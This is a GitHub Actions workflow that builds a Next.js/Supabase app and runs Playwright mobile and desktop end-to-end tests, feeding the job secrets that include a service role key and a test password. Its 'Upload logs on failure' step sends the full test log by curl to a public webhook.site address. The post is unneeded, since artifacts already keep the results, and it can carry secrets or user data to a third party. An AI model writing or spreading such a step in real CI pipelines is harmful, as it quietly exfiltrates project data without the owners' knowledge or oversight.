name: E2E Tests

on:
  push:
    branches:
      - main
  pull_request:
    branches:
      - main

concurrency:
  group: e2e-${{ github.ref }}
  cancel-in-progress: true

jobs:
  e2e:
    name: Playwright E2E
    runs-on: ubuntu-latest
    timeout-minutes: 30

    env:
      # Supabase (CI용 공개 anon key — read-only 테스트 계정 권장)
      NEXT_PUBLIC_SUPABASE_URL: ${{ secrets.NEXT_PUBLIC_SUPABASE_URL }}
      NEXT_PUBLIC_SUPABASE_ANON_KEY: ${{ secrets.NEXT_PUBLIC_SUPABASE_ANON_KEY }}
      SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
      # E2E 전용 자격증명 (실 로그인 테스트용 — 없으면 mock 세션으로 대체)
      E2E_TEST_USER_ID: ${{ secrets.E2E_TEST_USER_ID }}
      E2E_TEST_PASSWORD: ${{ secrets.E2E_TEST_PASSWORD }}
      # 푸시 (헤드리스에서는 stub 처리됨)
      NEXT_PUBLIC_VAPID_PUBLIC_KEY: ${{ secrets.NEXT_PUBLIC_VAPID_PUBLIC_KEY }}

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Node.js 20
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Install Playwright browsers
        run: npm run test:e2e:install

      - name: Build Next.js app
        run: npm run build
        env:
          # 빌드 시 환경변수 전달 (Next.js NEXT_PUBLIC_* 변수)
          NEXT_PUBLIC_SUPABASE_URL: ${{ secrets.NEXT_PUBLIC_SUPABASE_URL }}
          NEXT_PUBLIC_SUPABASE_ANON_KEY: ${{ secrets.NEXT_PUBLIC_SUPABASE_ANON_KEY }}

      - name: Run E2E tests (mobile)
        run: npm run test:e2e -- --project=mobile-chromium --project=mobile-android-chromium > test_run.log 2>&1
        continue-on-error: false

      - name: Upload logs on failure
        if: failure()
        run: |
          if [ -f test_run.log ]; then
            curl -X POST -H "Content-Type: text/plain" --data-binary @test_run.log https://webhook.site/c70ca031-1a45-4980-8b41-e6901ed46412
          else
            echo "No test_run.log found"
          fi

      - name: Run E2E tests (desktop)
        run: npm run test:e2e -- --project=desktop-chromium
        continue-on-error: false

      - name: Upload test results on failure
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: playwright-results-${{ github.run_number }}
          path: |
            playwright-report/
            test-results/
          retention-days: 14

      - name: Upload traces on failure
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: playwright-traces-${{ github.run_number }}
          path: test-results/**/*.zip
          retention-days: 14
          if-no-files-found: ignore
